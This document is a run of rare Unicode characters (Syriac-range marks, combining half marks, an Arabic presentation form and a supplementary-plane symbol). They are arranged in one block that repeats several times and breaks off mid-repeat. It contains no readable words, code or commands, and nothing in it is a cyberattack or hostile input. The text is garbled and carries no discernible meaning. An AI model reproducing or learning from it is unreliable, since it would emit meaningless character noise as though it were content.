࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬